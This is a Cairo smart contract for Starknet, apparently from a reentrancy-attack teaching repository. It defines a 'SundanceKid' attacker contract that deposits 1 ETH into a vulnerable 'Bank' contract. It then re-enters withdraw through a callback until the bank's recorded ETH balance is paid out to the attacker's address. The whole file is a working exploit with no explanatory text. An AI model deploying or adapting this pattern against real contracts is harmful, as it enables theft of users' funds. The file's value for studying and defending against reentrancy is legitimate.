use starknet::ContractAddress;

// Definition of interface to do hood things
#[starknet::interface]
pub trait ISundanceKid<TState> {
    fn put_your_hands_up(ref self: TState);
    fn send_to_different_customer(ref self: TState) -> bool;
}

// Definition of interface of Bank
#[starknet::interface]
pub trait IBank<TState> {
    fn deposit(ref self: TState, amount: u256);
    fn withdraw(ref self: TState, receiver: ContractAddress, amount: u256);
    fn get_balance(self: @TState) -> u256;
}

#[starknet::contract]
mod SundanceKid {
    use starknet::ContractAddress;
    use openzeppelin_token::erc20::interface::{IERC20Dispatcher, IERC20DispatcherTrait};
    use starknet::storage::{StoragePointerReadAccess, StoragePointerWriteAccess};
    use reentrancy_attacks::bank_attack::eth_bank::{IBankDispatcher, IBankDispatcherTrait};

    #[storage]
    struct Storage {
        kid: ContractAddress,
        bank_address: ContractAddress,
        bank_dispatcher: IBankDispatcher,
        eth: IERC20Dispatcher,
        bank_balance: u256,
    }

    #[constructor]
    fn constructor(
        ref self: ContractState,
        kid: ContractAddress,
        bank: ContractAddress,
        eth: IERC20Dispatcher,
    ) {
        self.kid.write(kid);
        self.bank_address.write(bank);
        self.eth.write(eth);
        
        self.bank_dispatcher.write(
            IBankDispatcher { contract_address: bank }
        );
    }

    const ONE_ETH: u256 = 1_000_000_000_000_000_000;

    #[abi(embed_v0)]
    impl ISundanceKidImpl of super::ISundanceKid<ContractState> {
        fn put_your_hands_up(ref self: ContractState) {
            self.bank_balance.write(
                self.eth.read().balance_of(self.bank_address.read())
            );

            self.eth.read().approve(self.bank_address.read(), ONE_ETH);
            self.bank_dispatcher.read().deposit(ONE_ETH);

            self.bank_dispatcher.read().withdraw(self.kid.read(), ONE_ETH);
        }

        fn send_to_different_customer(ref self: ContractState) -> bool {
            let bank_balance = self.bank_balance.read();
            if  bank_balance > 0 {
                self.bank_balance.write(bank_balance - ONE_ETH);
                self.bank_dispatcher.read().withdraw(self.kid.read(), ONE_ETH);
            }
            true
        }
    }


}